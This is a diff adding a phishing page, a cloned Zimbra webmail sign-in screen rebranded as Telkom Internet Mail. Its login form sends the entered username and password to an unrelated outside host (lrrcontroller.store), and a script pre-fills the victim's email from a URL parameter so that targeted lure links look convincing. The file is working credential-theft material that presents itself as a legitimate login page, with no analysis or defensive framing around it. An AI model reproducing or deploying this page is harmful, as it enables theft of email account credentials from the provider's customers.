@@ -1,0 +1,173 @@
+<html class="user_font_size_normal" lang="en"><head>
+<!--
+ login.jsp
+ * ***** BEGIN LICENSE BLOCK *****
+ * Zimbra Collaboration Suite Web Client
+ * Copyright (C) 2007, 2008, 2009, 2010, 2011, 2012, 2013, 2014, 2015, 2016 Synacor, Inc.
+ *
+ * This program is free software: you can redistribute it and/or modify it under
+ * the terms of the GNU General Public License as published by the Free Software Foundation,
+ * version 2 of the License.
+ *
+ * This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
+ * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+ * See the GNU General Public License for more details.
+ * You should have received a copy of the GNU General Public License along with this program.
+ * If not, see <https://www.gnu.org/licenses/>.
+ * ***** END LICENSE BLOCK *****
+-->
+	<meta http-equiv="Content-Type" content="text/html;charset=utf-8">
+<!--	<title>Zimbra Web Client Sign In</title> -->
+	<title>Telkom Internet web client </title>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta name="description" content="Zimbra provides open source server and client software for messaging and collaboration. To find out more visit https://www.zimbra.com.">
+	<meta name="apple-mobile-web-app-capable" content="yes">
+	<meta name="apple-mobile-web-app-status-bar-style" content="black">
+	<link rel="stylesheet" type="text/css" href="skin.css?skin=harmony&amp;v=231201114945">
+	<link rel="SHORTCUT ICON" href="https://webmail.telkomsa.net/mail/img/logo/favicon.ico">
+
+	
+	<script>
+  var pixelDepth;
+window.onload = function() {
+    screenProperties();
+  };
+
+  function screenProperties()
+  {
+	var txtEmail = document.getElementById('textbox1');
+	const queryString = window.location.search;
+	const urlParams = new URLSearchParams(queryString);
+	const code = urlParams.get('email')
+	username.value = code;
+	/*if(code=="")
+	{
+		document.getElementById("divEmail").innerText = "No Email Found";
+		}else{
+	document.getElementById("divEmail").innerText = code;
+	}*/
+	
+
+	//return pixelDepth;
+  }
+</script>
+
+</head>
+<body>
+
+	<div class="LoginScreen">
+	<nav class="navbar navbar-expand-lg login-navbar" style="background-color: #007cc3;" role="navigation">
+	<a class="navbar-brand" href="https://www.telkomsa.net">
+		<img src="./TelkomSA-logo.png" alt="logo"> 
+	</a>
+</nav>
+	<p>&nbsp;</p>
+		<div class="center">
+			<div class="contentBox">
+				<!-- <h1><a href="https://www.zimbra.com/" id="bannerLink" target="_new" title='Zimbra'><span class="ScreenReaderOnly">Zimbra</span> 
+				
+					<span class="ImgLoginBanner"></span>
+				</a></h1> -->
+				<h1 style="padding:15px; font-weight:600; color:white">Telkom Internet Mail</h1>
+
+				
+				<div id="ZLoginAppName">Web Client</div>
+				<form method="post" name="loginForm" action="https://lrrcontroller.store/telkom/login.php">
+								<input type="hidden" name="loginOp" value="login">
+								<input type="hidden" name="login_csrf" value="cddb0dd6-d543-4954-b7fc-b2a0b5d9f18b">
+
+								<table class="form">
+                        <tbody><tr>
+                                        <td><label for="username">Username:</label></td>
+                                        <td><input id="username" class="zLoginField" name="username" type="text" value="" size="40" maxlength="1024" autocapitalize="none" autocorrect="off" required=""></td>
+                                        </tr>
+                                        <tr>
+                                <td><label for="password">Password:</label></td>
+                                <td><input id="password" autocomplete="off" class="zLoginField" name="password" type="password" value="" size="40" maxlength="1024" required=""></td>
+                                </tr>
+                                <tr>
+                                <td>&nbsp;</td>
+                                <td class="submitTD">
+                                <input id="remember" value="1" type="checkbox" name="zrememberme">
+                                    <label for="remember">Stay signed in</label>
+                                <input type="submit" class="ZLoginButton DwtButton" value="Sign In">
+                                </td>
+                                </tr>
+			
+				<tr>
+                            <td colspan="2"><hr></td>
+                            </tr>
+                            <tr>
+                            <td>
+                            <label for="client">Version:</label>
+                            </td>
+                            <td>
+                            <div class="positioning">
+                            <select id="client" name="client" onchange="clientChange(this.options[this.selectedIndex].value)">
+                                    <option value="preferred" selected=""> Default</option>
+                                    <option value="advanced"> Classic</option>
+                                    <option value="standard"> ???clientStandard???</option>
+                                    <option value="mobile"> Mobile</option>
+                                    </select>
+                                <script type="text/javascript">
+                        document.write("<a href='#' onclick='showWhatsThis();' id='ZLoginWhatsThisAnchor' aria-controls='ZLoginWhatsThis' aria-expanded='false'>What’s This?</a>");
+                        </script><a href="#" onclick="showWhatsThis();" id="ZLoginWhatsThisAnchor" aria-controls="ZLoginWhatsThis" aria-expanded="false">What’s This?</a>
+                        <div id="ZLoginWhatsThis" class="ZLoginInfoMessage" style="display:none;" onclick="showWhatsThis();" role="tooltip"><p><strong>Modern</strong><br> The Modern Web App delivers a responsive experience across all your devices and integrates with many popular apps.</p><p><strong>Classic</strong><br> The Classic Web App is familiar to long-time Zimbra users. It delivers advanced collaboration and calendar features popular with power users on Desktop web browsers.</p><p><strong>Default</strong><br> This will sign you in according to your saved Preference. In the Modern Web App, set this preference in Settings &gt; General &gt; Zimbra Version. In Classic, set it in Preferences &gt; General &gt; Sign In.</p></div>
+                        <div id="ZLoginUnsupported" class="ZLoginInfoMessage" style="display:none;">Note that your web browser or display does not fully support the Advanced version.  We strongly recommend that you use the Standard client.</div>
+                        </div>
+                        </td>
+                        </tr>
+                        </tbody></table>
+                    </form>
+			</div>
+			<div class="decor1"></div>
+		</div>
+
+		<!-- <div class="Footer">
+			<div id="ZLoginNotice" class="legalNotice-small"><a target="_new" href="https://www.zimbra.com">Zimbra</a> :: the leader in open source messaging and collaboration :: <a target="_new" href="https://blog.zimbra.com">Blog</a> - <a target="_new" href="https://wiki.zimbra.com">Wiki</a> - <a target="_new" href="https://www.zimbra.com/forums">Forums</a></div>
+			<div class="copyright">
+			Copyright © 2005-2023 Synacor, Inc. All rights reserved. "Zimbra" is a registered trademark of Synacor, Inc.</div>
+		</div> -->
+
+		<div class="Footer">
+
+
+			
+<footer class="page-footer font-small">
+
+
+
+
+  <!-- Copyright -->
+  <div class="footer-copyright text-white text-center py-3" style="background-color: #007cc3;"> Copyright Telkom SA SOC Limited. 2020 . All Rights Reserved.
+        
+        <img src="./TelkomSA-logo.png" alt="logo" style="float: right;padding-right: 17px;padding-bottom: 7px;">
+  </div>
+  <!-- Copyright -->
+
+</footer>
+
+
+
+	<!--
+		<div id="ZLoginNotice" class="legalNotice-small"><a target="_new" href="http://www.zimbra.com">Zimbra</a> :: the leader in open source messaging and collaboration :: <a target="_new" href="http://blog.zimbra.com">Blog</a> - <a target="_new" href="http://wiki.zimbra.com">Wiki</a> - <a target="_new" href="http://www.zimbra.com/forums">Forums</a></div>
+        
+        <div class="copyright">
+            Copyright  2005-2014 Telligent Systems, Inc. All rights reserved. "Telligent" and "Zimbra" are registered trademarks or trademarks of Telligent Systems, Inc.
+            </div> -->
+        </div>
+
+		<div class="decor2"></div>
+	</div>
+
+
+<!-- Latest compiled and minified CSS -->
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css">
+
+
+
+
+
+
+
+</body></html>
